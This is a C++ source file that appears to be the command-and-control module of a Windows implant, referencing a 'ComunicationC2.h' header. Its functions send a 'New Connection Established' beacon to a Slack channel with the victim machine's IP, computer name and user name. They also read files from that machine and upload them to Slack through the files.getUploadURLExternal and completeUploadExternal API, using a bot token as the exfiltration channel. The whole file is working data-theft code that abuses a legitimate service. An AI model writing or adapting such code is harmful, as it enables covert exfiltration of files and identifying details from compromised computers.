#include "commun.h" // Assuming this declares SendDataToServer, ConnectToServer if needed elsewhere
#include "ComunicationC2.h" // Assuming this contains other relevant declarations/definitions

#include <string>
#include <vector>    // For buffers
#include <windows.h>
#include <winhttp.h>
#include <ctime>     // For timestamp
#include <stdlib.h>  // For mbstowcs_s, wcstombs_s if used
#include <cstdio>    // For snprintf, fopen_s, printf etc.
#include <stdexcept> // For potential error handling
#include <sstream>   // For multipart construction and UrlEncode
#include <iomanip>   // For UrlEncode
#include <cctype>    // For UrlEncode

#pragma comment(lib, "winhttp.lib") // Link against winhttp

// --- Configuration ---
#define SLACK_API_HOST L"slack.com"
#define SLACK_GET_UPLOAD_URL_PATH L"/api/files.getUploadURLExternal"
#define SLACK_COMPLETE_UPLOAD_PATH L"/api/files.completeUploadExternal"
#define SLACK_POST_MESSAGE_PATH L"/api/chat.postMessage"
// --- IMPORTANT: Replace placeholders below! ---
#define SLACK_BOT_TOKEN L"xoxb-bot-Token"
#define SLACK_CHANNEL_ID "Channel-ID"
// --- End Placeholders ---

// Define a boundary for multipart/form-data (must be unique enough)
const std::string MULTIPART_BOUNDARY = "----CppWinHttpSlackUploadBoundary7MA4YWxkTrZu0gW"; // Unique boundary
const std::string MULTIPART_BOUNDARY_LINE = "--" + MULTIPART_BOUNDARY + "\r\n";
const std::string MULTIPART_BOUNDARY_LAST = "--" + MULTIPART_BOUNDARY + "--\r\n";


// --- Helper Functions ---

// Get current UTC timestamp
std::string GetCurrentUTCTimestamp() {
    time_t now;
    time(&now);
    struct tm utc_tm;
    if (gmtime_s(&utc_tm, &now) != 0) {
        perror("gmtime_s failed");
        // Return a noticeable error string instead of crashing or returning empty
        return "TIMESTAMP_ERROR";
    }
    char timestamp[32];
    // Format: YYYY-MM-DD HH:MM:SS
    strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", &utc_tm);
    return std::string(timestamp);
}

// Convert multi-byte string (UTF-8 assumed) to wide string (wchar_t)
std::wstring MultiByteToWideCharHelper(const std::string& str) {
    if (str.empty()) return std::wstring();
    // Determine required buffer size
    int size_needed = MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), NULL, 0);
    if (size_needed <= 0) {
        printf("[-] MultiByteToWideChar preliminary call failed for string of size %zu. Error: %lu\n", str.size(), GetLastError());
        return std::wstring(); // Return empty on error
    }
    std::wstring wstrTo(size_needed, 0);
    // Perform the conversion
    int chars_converted = MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), &wstrTo[0], size_needed);
    if (chars_converted <= 0) {
        printf("[-] MultiByteToWideChar conversion failed. Error: %lu\n", GetLastError());
        return std::wstring(); // Return empty on error
    }
    return wstrTo;
}

// Convert wide string (wchar_t) to multi-byte string (UTF-8)
std::string WideCharToMultiByteHelper(const wchar_t* wstr) {
    if (!wstr || wstr[0] == L'\0') return std::string();
    int wstr_len = static_cast<int>(wcslen(wstr));
    // Determine required buffer size
    int size_needed = WideCharToMultiByte(CP_UTF8, 0, wstr, wstr_len, NULL, 0, NULL, NULL);
    if (size_needed <= 0) {
        printf("[-] WideCharToMultiByte preliminary call failed for wstring. Error: %lu\n", GetLastError());
        return std::string();
    }
    std::string strTo(size_needed, 0);
    // Perform the conversion
    int chars_converted = WideCharToMultiByte(CP_UTF8, 0, wstr, wstr_len, &strTo[0], size_needed, NULL, NULL);
    if (chars_converted <= 0) {
        printf("[-] WideCharToMultiByte conversion failed. Error: %lu\n", GetLastError());
        return std::string();
    }
    return strTo;
}

// Get filename from a full path (handles both \ and / separators)
std::string GetFileName(const char* filePath) {
    if (!filePath) return "";
    const char* slash = strrchr(filePath, '/');
    const char* backslash = strrchr(filePath, '\\');
    const char* lastSeparator = (slash > backslash) ? slash : backslash;

    if (lastSeparator) {
        // Return the part after the last separator
        return std::string(lastSeparator + 1);
    }
    // If no separator found, the whole path is the filename (handle relative paths)
    return std::string(filePath);
}

// Escape characters in a string for JSON compatibility
std::string EscapeJson(const std::string& input) {
    std::string output;
    output.reserve(input.length()); // Avoid reallocations
    for (char c : input) {
        switch (c) {
        case '"': output += "\\\""; break;
        case '\\': output += "\\\\"; break;
        case '\b': output += "\\b"; break;
        case '\f': output += "\\f"; break;
        case '\n': output += "\\n"; break;
        case '\r': output += "\\r"; break;
        case '\t': output += "\\t"; break;
            // Note: Forward slash '/' doesn't strictly NEED escaping in JSON,
            // but many encoders do it (like Slack's). We don't need to add it here.
        default:
            // Handle control characters (U+0000 to U+001F)
            if (c >= 0 && c <= 0x1f) {
                char buf[7]; // "\\uXXXX\0"
                snprintf(buf, sizeof(buf), "\\u%04x", static_cast<unsigned char>(c));
                output += buf;
            }
            else {
                // Append valid characters directly
                output += c;
            }
        }
    }
    return output;
}

// Basic function to extract a string value associated with a key from simple JSON
// WARNING: Very basic, not robust against complex JSON or escaped quotes within values.
std::string ExtractJsonValue(const std::string& json, const std::string& key) {
    std::string searchKey = "\"" + key + "\":\""; // Look for "key":"value"
    size_t startPos = json.find(searchKey);
    if (startPos == std::string::npos) {
        // Fallback: Try finding non-string value like "key":value (less robust)
        searchKey = "\"" + key + "\":";
        startPos = json.find(searchKey);
        if (startPos == std::string::npos) return ""; // Key not found at all

        startPos += searchKey.length();
        // Find the end of the value (comma or closing brace)
        size_t endPos = json.find_first_of(",}", startPos);
        if (endPos == std::string::npos) return ""; // Malformed JSON?

        std::string value = json.substr(startPos, endPos - startPos);
        // Basic trim of whitespace and quotes (if accidentally captured)
        value.erase(0, value.find_first_not_of(" \t\n\r\""));
        value.erase(value.find_last_not_of(" \t\n\r\"") + 1);
        return value;
    }

    // Found string value pattern: "key":"value"
    startPos += searchKey.length();
    size_t endPos = json.find("\"", startPos); // Find the closing quote
    if (endPos == std::string::npos) {
        return ""; // Closing quote not found
    }

    // Rudimentary handling for escaped quotes inside the value ("\\\"")
    // This part is tricky and often fails with complex escaping.
    // A real JSON parser is needed for full correctness.
    while (endPos > 0 && json[endPos - 1] == '\\') {
        // If the quote is escaped, search for the next unescaped quote
        endPos = json.find("\"", endPos + 1);
        if (endPos == std::string::npos) return ""; // No valid end found
    }

    return json.substr(startPos, endPos - startPos);
}

// Helper to send HTTP requests using WinHTTP and get response/status code
bool SendHttpRequest(
    HINTERNET hConnect,         // Connection handle from WinHttpConnect
    LPCWSTR method,             // e.g., L"GET", L"POST"
    LPCWSTR path,               // e.g., L"/api/chat.postMessage"
    LPCWSTR additionalHeaders,  // e.g., L"Content-Type: application/json\r\nAuthorization: Bearer ..."
    LPCVOID body,               // Request body data (can be NULL)
    DWORD bodyLength,           // Length of the request body
    std::string& responseBody,  // OUT: Response body as string
    DWORD& statusCode)          // OUT: HTTP status code
{
    responseBody.clear();
    statusCode = 0; // Initialize output params

    // Open an HTTP request handle.
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, method, path,
        NULL, WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES, // Accept: */*
        WINHTTP_FLAG_SECURE);         // Use HTTPS

    if (!hRequest) {
        printf("[-] Failed WinHttpOpenRequest for %ls: %lu\n", path, GetLastError());
        return false;
    }

    // Send the request. Use const_cast because WinHttpSendRequest takes LPVOID
    // but shouldn't modify the input body buffer.
    BOOL requestSent = WinHttpSendRequest(hRequest, additionalHeaders, -1L, // Headers length -1L == auto-calculate
        const_cast<LPVOID>(body), bodyLength,
        bodyLength, 0); // Context

    if (!requestSent) {
        printf("[-] Failed WinHttpSendRequest (%ls): %lu\n", path, GetLastError());
        WinHttpCloseHandle(hRequest);
        return false;
    }

    // Wait for the response.
    if (!WinHttpReceiveResponse(hRequest, NULL)) { // Reserved NULL
        printf("[-] Failed WinHttpReceiveResponse (%ls): %lu\n", path, GetLastError());
        WinHttpCloseHandle(hRequest);
        return false;
    }

    // Query the status code.
    DWORD dwStatusCodeSize = sizeof(statusCode);
    if (!WinHttpQueryHeaders(hRequest,
        WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
        WINHTTP_HEADER_NAME_BY_INDEX,
        &statusCode, &dwStatusCodeSize, WINHTTP_NO_HEADER_INDEX)) {
        printf("[-] Warning: Failed WinHttpQueryHeaders (Status Code) for %ls: %lu\n", path, GetLastError());
        // Continue to try reading body, but status code might remain 0
    }

    // Keep reading data until there is no more.
    DWORD bytesAvailable = 0;
    std::vector<char> responseBuffer; // Use a vector for dynamic resizing

    do {
        bytesAvailable = 0;
        if (!WinHttpQueryDataAvailable(hRequest, &bytesAvailable)) {
            printf("[-] Error in WinHttpQueryDataAvailable (%ls): %lu\n", path, GetLastError());
            WinHttpCloseHandle(hRequest);
            return false; // Treat as failure if data query fails
        }

        if (bytesAvailable > 0) {
            size_t currentSize = responseBuffer.size();
            responseBuffer.resize(currentSize + bytesAvailable); // Allocate space

            DWORD bytesReadThisCall = 0;
            if (!WinHttpReadData(hRequest, &responseBuffer[currentSize], bytesAvailable, &bytesReadThisCall)) {
                printf("[-] Error in WinHttpReadData (%ls): %lu\n", path, GetLastError());
                WinHttpCloseHandle(hRequest);
                return false; // Treat as failure if read fails
            }
            if (bytesReadThisCall == 0 && bytesAvailable != 0) {
                // This might indicate the end of stream or an issue. Break loop.
                break;
            }
            // Optional: Resize buffer back if less data was read than available (unlikely)
            // responseBuffer.resize(currentSize + bytesReadThisCall);
        }
    } while (bytesAvailable > 0);

    // Assign collected data to the output string
    if (!responseBuffer.empty()) {
        responseBody.assign(responseBuffer.data(), responseBuffer.size());
    }

    WinHttpCloseHandle(hRequest); // Close the request handle
    return true; // Request cycle completed (check statusCode and responseBody for success details)
}


// --- Core Logic ---

// Uploads a file to Slack using the new 3-step method
void SendDataToServer(const char* filePath, BYTE* fileHash, const char* ip, const char* computerName, const char* userName) {
    std::string timestamp = GetCurrentUTCTimestamp();
    const char* login = "Bot"; // Consider making this dynamic or a parameter
    std::string filename = GetFileName(filePath);
    std::string uploadUrl; // Will hold the temporary upload URL
    std::string fileId;    // Will hold the Slack file ID
    std::string apiResponse; // Buffer for API responses
    DWORD statusCode = 0;    // HTTP status code from API calls

    // --- Validate Inputs ---
    if (!filePath || filename.empty()) {
        printf("[-] Invalid file path or generated empty filename.\n");
        return;
    }
    // Optional: Add check for fileHash if it's strictly required
    // if (!fileHash) { printf("[-] File hash is NULL for %s.\n", filename.c_str()); return; }


    // --- Get File Size and Content ---
    printf("[+] Processing: %s\n", filePath);
    FILE* file = nullptr;
    errno_t err = fopen_s(&file, filePath, "rb"); // Use safer fopen_s
    if (err != 0 || !file) {
        printf("[-] Failed to open file: %s (errno: %d)\n", filePath, err);
        return;
    }

    fseek(file, 0, SEEK_END); // Go to end of file
    long fileSize = ftell(file); // Get current file pointer position (size)
    rewind(file); // Go back to beginning of file

    if (fileSize < 0) { // Check for error from ftell
        printf("[-] Failed to determine file size for: %s\n", filePath);
        fclose(file);
        return;
    }
    if (fileSize == 0) {
        printf("[-] File is empty, skipping upload: %s\n", filePath);
        fclose(file);
        return; // Avoid uploading empty files if unwanted
    }
    // Optional: Add a maximum size check if necessary (e.g., Slack's 1GB limit)
    // if (fileSize > 1024 * 1024 * 1024) { ... }

    std::vector<char> fileBuffer(fileSize); // Allocate buffer on the heap
    size_t bytesRead = fread(fileBuffer.data(), 1, fileSize, file); // Read file into buffer
    fclose(file); // Close file handle ASAP

    if (bytesRead != static_cast<size_t>(fileSize)) {
        printf("[-] Failed to read entire file content: %s (read %zu / %ld bytes)\n", filePath, bytesRead, fileSize);
        return; // Don't proceed with incomplete data
    }

    // --- Convert file hash to hex string (assuming 32-byte hash like SHA-256) ---
    char fileHashStr[65] = { 0 }; // 32 bytes * 2 hex chars + null terminator
    if (fileHash) {
        for (int i = 0; i < 32; ++i) {
            sprintf_s(fileHashStr + (i * 2), sizeof(fileHashStr) - (i * 2), "%02x", fileHash[i]);
        }
    }
    else {
        // Handle case where hash is not provided
        strcpy_s(fileHashStr, "N/A");
    }
    printf("[+] SHA-256: %s\n", fileHashStr);


    // --- Initialize WinHTTP Session ---
    HINTERNET hSession = WinHttpOpen(L"FileUploader/1.0", // User agent string
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, // Use default proxy settings
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0); // Flags

    if (!hSession) {
        printf("[-] Failed WinHttpOpen session: %lu\n", GetLastError());
        return; // Cannot proceed without a session
    }

    // --- Connect to Slack API Host ---
    HINTERNET hConnectSlack = WinHttpConnect(hSession, SLACK_API_HOST,
        INTERNET_DEFAULT_HTTPS_PORT, 0); // Use default HTTPS port, flags 0

    if (!hConnectSlack) {
        printf("[-] Failed WinHttpConnect to %ls: %lu\n", SLACK_API_HOST, GetLastError());
        WinHttpCloseHandle(hSession);
        return; // Cannot proceed without connection
    }

    // === STEP 1: Get Upload URL (files.getUploadURLExternal) using multipart/form-data ===
    printf("[.] Step 1: Getting upload URL (using multipart/form-data)...\n");
    { // Scope for Step 1 variables
        // 1. Construct the multipart body
        std::ostringstream multipartBodyStream;
        multipartBodyStream << MULTIPART_BOUNDARY_LINE;
        multipartBodyStream << "Content-Disposition: form-data; name=\"filename\"\r\n\r\n";
        multipartBodyStream << filename << "\r\n";
        multipartBodyStream << MULTIPART_BOUNDARY_LINE;
        multipartBodyStream << "Content-Disposition: form-data; name=\"length\"\r\n\r\n";
        multipartBodyStream << std::to_string(fileSize) << "\r\n";
        multipartBodyStream << MULTIPART_BOUNDARY_LAST;
        std::string getUrlPayloadMultipart = multipartBodyStream.str();
        printf("[DBG] Payload (multipart) for getUploadURL:\n%s", getUrlPayloadMultipart.c_str());

        // 2. Set the correct headers for multipart/form-data
        std::wstring getUrlHeaders = L"Content-Type: multipart/form-data; boundary=" + MultiByteToWideCharHelper(MULTIPART_BOUNDARY) + L"\r\n";
        getUrlHeaders += L"Authorization: Bearer " SLACK_BOT_TOKEN L"\r\n";
        getUrlHeaders += L"Content-Length: " + std::to_wstring(getUrlPayloadMultipart.length()) + L"\r\n";
        printf("[DBG] Headers for getUploadURL:\n%ls", getUrlHeaders.c_str());

        // 3. Send the request
        if (!SendHttpRequest(hConnectSlack, L"POST", SLACK_GET_UPLOAD_URL_PATH, getUrlHeaders.c_str(),
            getUrlPayloadMultipart.c_str(), getUrlPayloadMultipart.length(),
            apiResponse, statusCode))
        {
            printf("[-] Failed during getUploadURLExternal request execution.\n");
            goto cleanup; // Use goto for central cleanup on failure
        }

        // 4. Handle the response
        printf("[.] GetUploadURL Response Status: %lu\n", statusCode);
        // printf("[DBG] GetUploadURL Response Body: %s\n", apiResponse.c_str()); // Uncomment for full response

        if (statusCode >= 200 && statusCode < 300 && apiResponse.find("\"ok\":true") != std::string::npos) {
            uploadUrl = ExtractJsonValue(apiResponse, "upload_url");
            fileId = ExtractJsonValue(apiResponse, "file_id");
            if (uploadUrl.empty() || fileId.empty()) {
                printf("[-] Failed to parse upload_url or file_id from successful response: %s\n", apiResponse.c_str());
                goto cleanup;
            }
            printf("[+] Got Upload URL (truncated): %s...\n", uploadUrl.substr(0, 70).c_str());
            printf("[+] Got File ID: %s\n", fileId.c_str());
        }
        else {
            printf("[-] files.getUploadURLExternal failed. Status: %lu, Response: %s\n", statusCode, apiResponse.c_str());
            goto cleanup;
        }
    } // End Scope for Step 1

    // === STEP 2: Upload File Content (POST to upload_url) ===
    printf("[.] Step 2: Uploading file content (%ld bytes) via POST...\n", fileSize);
    { // Scope for Step 2 variables

        // --- UNESCAPE THE UPLOAD URL ---
        size_t pos = 0;
        while ((pos = uploadUrl.find("\\/", pos)) != std::string::npos) {
            uploadUrl.replace(pos, 2, "/"); // Replace "\/" with "/"
            pos += 1; // Move past the replaced character
        }
        printf("[DBG] Cleaned upload URL: %s\n", uploadUrl.c_str()); // Debug the cleaned URL
        // --- END UNESCAPE ---

        std::wstring wUploadUrl = MultiByteToWideCharHelper(uploadUrl); // Convert cleaned URL
        if (wUploadUrl.empty() && !uploadUrl.empty()) {
            printf("[-] Failed to convert cleaned upload URL to wide char.\n");
            goto cleanup;
        }

        // Crack the URL to get host and path
        URL_COMPONENTSW urlComp = { 0 };
        wchar_t szHostName[256] = { 0 }; // Buffer for host name
        wchar_t szUrlPath[2048] = { 0 }; // Buffer for path + query (needs to be large)

        urlComp.dwStructSize = sizeof(urlComp);
        urlComp.lpszHostName = szHostName; urlComp.dwHostNameLength = _countof(szHostName);
        urlComp.lpszUrlPath = szUrlPath; urlComp.dwUrlPathLength = _countof(szUrlPath);
        // Request cracking of components
        urlComp.dwSchemeLength = (DWORD)-1;
        urlComp.dwHostNameLength = (DWORD)-1;
        urlComp.dwUrlPathLength = (DWORD)-1;
        urlComp.dwExtraInfoLength = (DWORD)-1;


        if (!WinHttpCrackUrl(wUploadUrl.c_str(), wUploadUrl.length(), 0, &urlComp)) {
            printf("[-] Failed WinHttpCrackUrl for cleaned upload URL: %s (%lu)\n", uploadUrl.c_str(), GetLastError());
            goto cleanup;
        }

        // Ensure port is set, default to HTTPS for Slack upload URLs
        if (urlComp.nPort == 0) {
            urlComp.nPort = INTERNET_DEFAULT_HTTPS_PORT;
            printf("[DBG] WinHttpCrackUrl using default HTTPS port: %d\n", urlComp.nPort);
        }

        // Connect to the *upload host* (might be different from slack.com)
        HINTERNET hUploadConnect = WinHttpConnect(hSession, szHostName, urlComp.nPort, 0);
        if (!hUploadConnect) {
            printf("[-] Failed WinHttpConnect to upload host: %ls (Port: %d) Error: %lu\n", szHostName, urlComp.nPort, GetLastError());
            goto cleanup;
        }

        // Prepare headers for POSTing raw file bytes
        std::wstring postHeaders = L"Content-Type: application/octet-stream\r\n";
        postHeaders += L"Content-Length: " + std::to_wstring(fileSize) + L"\r\n";

        std::string postResponse;
        DWORD postStatusCode = 0;

        // Send the POST request with file data as body
        if (!SendHttpRequest(hUploadConnect, L"POST", szUrlPath, postHeaders.c_str(),
            fileBuffer.data(), // Pointer to file data
            fileSize,          // Length of file data
            postResponse, postStatusCode))
        {
            printf("[-] Failed during POST request execution to upload URL.\n");
            WinHttpCloseHandle(hUploadConnect); // Close upload connection before cleanup
            goto cleanup;
        }
        WinHttpCloseHandle(hUploadConnect); // Close upload connection

        // Handle the response from the upload server
        printf("[.] POST Response Status: %lu\n", postStatusCode);
        // printf("[DBG] POST Response Body: %s\n", postResponse.c_str()); // Usually empty on success

        // Check for success (usually 200 OK for S3-like uploads)
        if (postStatusCode < 200 || postStatusCode >= 300) {
            printf("[-] File content upload (POST) failed. Status: %lu, Response: %s\n", postStatusCode, postResponse.c_str());
            goto cleanup;
        }
        printf("[+] File content uploaded successfully via POST.\n");
    } // End Scope for Step 2

    // === STEP 3: Complete Upload (files.completeUploadExternal) ===
    printf("[.] Step 3: Completing upload...\n");
    { // Scope for Step 3 variables
        // Create the initial comment string with metadata
        char commentBuffer[2048]; // Adjust size as needed
        snprintf(commentBuffer, sizeof(commentBuffer),
            "File Upload Details:\n"
            "```\n" // Use Slack's code block formatting
            "Timestamp (UTC): %s\n"
            "Login:           %s\n"
            "Source IP:       %s\n"
            "Computer Name:   %s\n"
            "User Name:       %s\n"
            "Original Path:   %s\n" // Consider security implications if path is sensitive
            "SHA-256:         %s\n"
            "Size (bytes):    %ld\n"
            "```",
            timestamp.c_str(),
            login ? login : "N/A",
            ip ? ip : "N/A",
            computerName ? computerName : "N/A",
            userName ? userName : "N/A",
            filePath ? filePath : "N/A",
            fileHashStr, // Use the hex hash string
            fileSize);

        // Prepare JSON payload for completeUploadExternal
        // 'files' is an array of objects, each requires 'id', optionally 'title'
        std::string completePayload = "{\"files\":[{\"id\":\"" + EscapeJson(fileId) + "\",\"title\":\"" + EscapeJson(filename) + "\"}],";
        completePayload += "\"channel_id\":\"" + std::string(SLACK_CHANNEL_ID) + "\","; // MUST use channel_id
        completePayload += "\"initial_comment\":\"" + EscapeJson(std::string(commentBuffer)) + "\"}";
        // Optional: Add thread_ts if uploading to a thread: "\"thread_ts\":\"YOUR_THREAD_TS\""
        printf("[DBG] Payload for completeUpload: %s\n", completePayload.c_str());

        // Prepare headers (JSON content type)
        std::wstring completeHeaders = L"Content-Type: application/json; charset=utf-8\r\n";
        completeHeaders += L"Authorization: Bearer " SLACK_BOT_TOKEN L"\r\n";
        completeHeaders += L"Content-Length: " + std::to_wstring(completePayload.length()) + L"\r\n"; // Add Content-Length

        std::string completeResponse;
        DWORD completeStatusCode = 0;

        // Send request back to the main Slack API host (hConnectSlack)
        if (!SendHttpRequest(hConnectSlack, L"POST", SLACK_COMPLETE_UPLOAD_PATH, completeHeaders.c_str(),
            completePayload.c_str(), completePayload.length(),
            completeResponse, completeStatusCode))
        {
            printf("[-] Failed during completeUploadExternal request execution.\n");
            // No goto here, cleanup will happen anyway
        }

        // Handle the response
        printf("[.] CompleteUpload Response Status: %lu\n", completeStatusCode);
        // printf("[DBG] CompleteUpload Response Body: %s\n", completeResponse.c_str()); // Uncomment for debugging

        if (completeStatusCode >= 200 && completeStatusCode < 300 && completeResponse.find("\"ok\":true") != std::string::npos) {
            printf("[+] File upload completed and shared successfully to Slack channel %s!\n", SLACK_CHANNEL_ID);
        }
        else {
            printf("[-] files.completeUploadExternal failed. Status: %lu, Response: %s\n", completeStatusCode, completeResponse.c_str());
        }
    } // End Scope for Step 3


cleanup: // Central cleanup point for WinHTTP handles
    if (hConnectSlack) WinHttpCloseHandle(hConnectSlack); // Close connection to slack.com
    if (hSession) WinHttpCloseHandle(hSession);           // Close the session handle
    printf("[.] Cleanup finished for %s.\n\n", filename.c_str());
}


// Sends an initial connection message to Slack using chat.postMessage
void ConnectToServer(const char* ip, const char* computerName, const char* userName) {
    printf("[*] Attempting to send connection notification...\n");
    std::string timestamp = GetCurrentUTCTimestamp();

    // Create connection message using Slack's code block formatting
    std::string message = "New Connection Established:\n";
    message += "```\n";
    message += "Timestamp (UTC): " + timestamp + "\n";
    message += "Login:           " + std::string("shjamal") + "\n"; // Hardcoded, consider parameterizing
    message += "Source IP:       " + std::string(ip ? ip : "N/A") + "\n";
    message += "Computer Name:   " + std::string(computerName ? computerName : "N/A") + "\n";
    message += "User Name:       " + std::string(userName ? userName : "N/A") + "\n";
    message += "```";

    // Initialize WinHTTP Session
    HINTERNET hSession = WinHttpOpen(L"ConnectionNotifier/1.0", // User agent
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) {
        printf("[-] Failed WinHttpOpen session for connection msg: %lu\n", GetLastError());
        return;
    }

    // Connect to Slack API Host
    HINTERNET hConnectSlack = WinHttpConnect(hSession, SLACK_API_HOST, INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnectSlack) {
        printf("[-] Failed WinHttpConnect for connection msg: %lu\n", GetLastError());
        WinHttpCloseHandle(hSession);
        return;
    }

    // Prepare JSON body for chat.postMessage
    std::string jsonBody = "{\"channel\":\"" + std::string(SLACK_CHANNEL_ID) + "\",\"text\":\"" + EscapeJson(message) + "\"}";
    printf("[DBG] Payload for postMessage: %s\n", jsonBody.c_str());

    // Prepare headers (JSON content type)
    std::wstring headers = L"Content-Type: application/json; charset=utf-8\r\n";
    headers += L"Authorization: Bearer " SLACK_BOT_TOKEN L"\r\n";
    headers += L"Content-Length: " + std::to_wstring(jsonBody.length()) + L"\r\n"; // Add Content-Length

    std::string responseBody;
    DWORD statusCode = 0;

    // Send the request
    if (!SendHttpRequest(hConnectSlack, L"POST", SLACK_POST_MESSAGE_PATH, headers.c_str(),
        jsonBody.c_str(), jsonBody.length(),
        responseBody, statusCode))
    {
        printf("[-] Failed during chat.postMessage request execution.\n");
    }
    else {
        // Handle the response
        printf("[.] Connection Notification Response Status: %lu\n", statusCode);
        if (statusCode >= 200 && statusCode < 300 && responseBody.find("\"ok\":true") != std::string::npos) {
            printf("[+] Connection notification sent to Slack channel %s\n", SLACK_CHANNEL_ID);
        }
        else {
            printf("[-] Failed to send connection notification. Status: %lu, Response: %s\n", statusCode, responseBody.c_str());
        }
    }

    // Cleanup WinHTTP handles
    if (hConnectSlack) WinHttpCloseHandle(hConnectSlack);
    if (hSession) WinHttpCloseHandle(hSession);
    printf("[+] Initial connection notification sequence completed.\n\n");
}

// --- Main or Entry Point Example (Illustrative) ---
/*
// NOTE: You'll need to implement SHA256 calculation elsewhere
// This is just a placeholder for demonstration.
void CalculateDummyHash(const char* filePath, BYTE hash[32]) {
     // Replace with your actual SHA256 implementation
     srand((unsigned int)time(0)); // Seed random number generator
     for(int i=0; i<32; ++i) hash[i] = (BYTE)(rand() % 256);
     printf("[DBG] Calculated dummy hash for %s\n", filePath);
}


int main() {
    // Example Usage: Replace with your actual logic
    const char* exampleIp = "192.168.1.101"; // Example data
    const char* exampleCompName = "WORKSTATION-01";
    const char* exampleUserName = "Alice";
    const char* exampleFilePath1 = "C:\\temp\\test_report.txt";
    const char* exampleFilePath2 = "C:\\temp\\image_data.jpg";
    BYTE fileHash[32] = {0}; // Buffer for the hash

    // 1. Send initial connection message
    ConnectToServer(exampleIp, exampleCompName, exampleUserName);

    // 2. Process and upload first file
    FILE* ftest1;
    if (fopen_s(&ftest1, exampleFilePath1, "w") == 0 && ftest1) {
        fprintf(ftest1, "This is the content of the first test file.\nReport data...");
        fclose(ftest1);
        CalculateDummyHash(exampleFilePath1, fileHash); // Calculate hash
        SendDataToServer(exampleFilePath1, fileHash, exampleIp, exampleCompName, exampleUserName);
    } else {
         printf("[-] Could not create test file %s\n", exampleFilePath1);
    }

     // Add a small delay if needed
     // Sleep(1000);

    // 3. Process and upload second file
     FILE* ftest2;
    if (fopen_s(&ftest2, exampleFilePath2, "wb") == 0 && ftest2) { // Use "wb" for binary files
        // Write some dummy binary data
        char dummyData[] = { 0x1F, (char)0x8B, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0x01 };
        fwrite(dummyData, sizeof(dummyData), 1, ftest2);
        fclose(ftest2);
        CalculateDummyHash(exampleFilePath2, fileHash); // Calculate hash
        SendDataToServer(exampleFilePath2, fileHash, exampleIp, exampleCompName, exampleUserName);
    } else {
         printf("[-] Could not create test file %s\n", exampleFilePath2);
    }


    printf("\nProcessing finished. Press Enter to exit...\n");
    getchar(); // Keep console window open
    return 0;
}
*/

// Make sure to define or include necessary functions from "commun.h" / "ComunicationC2.h"
// if SendDataToServer or ConnectToServer are called from other C++ files in your project.
// Also ensure you have a real SHA256 implementation if using the hash feature.